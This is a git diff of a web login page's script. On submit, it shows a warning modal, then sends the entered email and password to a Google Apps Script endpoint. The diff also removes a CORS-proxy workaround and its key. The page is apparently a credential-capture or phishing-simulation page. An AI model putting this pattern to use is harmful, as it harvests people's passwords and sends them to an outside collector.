@@ -65,36 +65,28 @@
   <div id="message"></div>
 
   <script>
-	  // const proxyURL = "https://proxy.cors.sh/";  // CORS Proxy Service
 
-    const proxyURL = "https://cors-anywhere.herokuapp.com/";  // CORS Proxy Service
-
-    const scriptURL = "https://script.google.com/macros/s/AKfycby51Hb5UF_94cpbW6Y40CQ0N7JISAOUigu7KaJFjI7QPilAUzt5yssJThF8M0CiRKER/exec";
+    const scriptURL = "https://script.google.com/macros/s/AKfycbympvmVyjmtnc02E0UB5X5hBpCM1fu_EMIeca5cTNrMZbvIIaQA00_NJ7qq-xiUgYkC/exec";
 
     document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
-		
-		
-	    // 顯示警告視窗（Modal）
-  document.getElementById("modal").style.display = "flex";
+	  // 顯示警告視窗（Modal）
+    document.getElementById("modal").style.display = "flex";
 
-      
 	  const formData = new FormData(this);
       const data = {
         email: formData.get("email"),
         password: formData.get("password")
       };
 
-      fetch(proxyURL + (scriptURL), {
+      fetch(scriptURL, {
+        redirect: "follow",
         method: "POST",
         body: JSON.stringify(data),
         headers: {
-          "Content-Type": "application/json",
-          
-  'x-cors-api-key': 'temp_30a44fa947d5ff99bea8eb7a86aa4b42',
-		  "x-requested-with": "XMLHttpRequest" // 需要設置這個 header 來繞過某些 CORS 防護
-        }
+          "Content-Type": "text/plain;charset=utf-8",
+        },
       })
       .then(res => res.json())
       .then(result => {
